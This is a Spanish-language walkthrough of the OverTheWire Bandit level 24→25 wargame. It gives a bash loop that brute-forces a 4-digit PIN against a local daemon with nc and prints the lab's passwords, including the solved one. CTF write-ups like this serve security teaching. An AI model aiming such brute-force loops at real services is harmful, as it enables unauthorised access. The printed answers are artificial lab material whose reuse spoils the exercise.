# Retos Bandit 
# Bandido Nivel 24 → Nivel 25

# Objetivo 
Un demonio está escuchando en el puerto 30002 y le dará la contraseña para Bandit25 si se le da la contraseña de Bandit24 y un código PIN numérico secreto de 4 dígitos. No hay forma de recuperar el código pin, excepto revisando todos los 10000 combinaciones, llamadas fuerza bruta.  
No es necesario crear nuevas conexiones cada vez

# Datos de acceso al nivel 
bandit24
ssh -l bandit24 bandit.labs.overthewire.org -p 2220
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
# Solución 
 ```
nc localhost 30002 <<< VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 1
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Fail! You did not supply enough data. Try again.
^C
bandit24@bandit:~$ echo {0000..0099}
0000 0001 0002 0003 0004 0005 0006 0007 0008 0009 0010 0011 0012 0013 0014 0015 0016 0017 0018 0019 0020 0021 0022 0023 0024 0025 0026 0027 0028 0029 0030 0031 0032 0033 0034 0035 0036 0037 0038 0039 0040 0041 0042 0043 0044 0045 0046 0047 0048 0049 0050 0051 0052 0053 0054 0055 0056 0057 0058 0059 0060 0061 0062 0063 0064 0065 0066 0067 0068 0069 0070 0071 0072 0073 0074 0075 0076 0077 0078 0079 0080 0081 0082 0083 0084 0085 0086 0087 0088 0089 0090 0091 0092 0093 0094 0095 0096 0097 0098 0099
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002
 Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
bandit24@bandit:~$
```

# Notas 

